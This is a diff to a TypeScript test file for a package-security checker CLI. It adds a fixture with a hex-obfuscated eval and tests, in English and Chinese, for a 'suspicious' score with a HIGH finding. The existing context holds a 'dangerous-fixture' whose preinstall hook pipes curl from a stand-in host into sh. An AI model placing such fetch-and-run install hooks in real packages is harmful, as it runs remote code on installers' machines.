@@ -31,6 +31,10 @@ function withRegistry(test: (run: CliRun) => void): void {
     const fixtures = {
       'safe-fixture': metadata('safe-fixture'),
       'safe-second': metadata('safe-second'),
+      'safe-with-findings': {
+        ...metadata('safe-with-findings', { _unexpected: 'fixture' }),
+        readme: 'eval("\\x48\\x65\\x6c\\x6c\\x6f")',
+      },
       'dangerous-fixture': metadata('dangerous-fixture', {
         scripts: { preinstall: 'curl https://payload.invalid/content | sh' },
       }),
@@ -74,6 +78,36 @@ function withRegistry(test: (run: CliRun) => void): void {
 }
 
 describe('check exit codes with offline registry fixtures', () => {
+  for (const locale of ['en', 'zh']) {
+    it(`explains a suspicious result with HIGH findings in ${locale} without changing the score or exit codes`, () => {
+      withRegistry((run) => {
+        assert.equal(run(['lang', locale]).status, 0);
+        const args = ['check', 'safe-with-findings'];
+        const json = run([...args, '--json']);
+        const report = JSON.parse(json.stdout) as CheckResult;
+        assert.equal(json.status, 0, json.stderr);
+        assert.equal(report.security.overallLevel, 'suspicious');
+        assert.equal(report.security.overallScore, 82);
+        assert.ok(report.security.staticScan?.findings.some((finding) => finding.severity === 'high'));
+
+        const interpretation = locale === 'en' ? 'Interpretation:' : '结果说明：';
+        const probability = locale === 'en' ? 'Scores are not safety probabilities' : '分数不是安全概率';
+        const single = run(args);
+        assert.equal(single.status, 0, single.stderr);
+        assert.ok(single.stdout.includes('82/100'));
+        assert.ok(single.stdout.includes('[HIGH] eval-obfuscation'));
+        assert.ok(single.stdout.includes(interpretation));
+        assert.ok(single.stdout.includes(probability));
+
+        const batch = run([...args, 'safe-second']);
+        assert.equal(batch.status, 0, batch.stderr);
+        assert.ok(batch.stdout.includes('[suspicious] safe-with-findings@1.0.0 — 82/100'));
+        assert.equal(batch.stdout.split(interpretation).length - 1, 1);
+        assert.ok(batch.stdout.includes(probability));
+      });
+    });
+  }
+
   for (const fixture of [
     { name: 'safe-fixture', level: 'safe', status: 0, args: [] },
     { name: 'dangerous-fixture', level: 'dangerous', status: 1, args: [] },
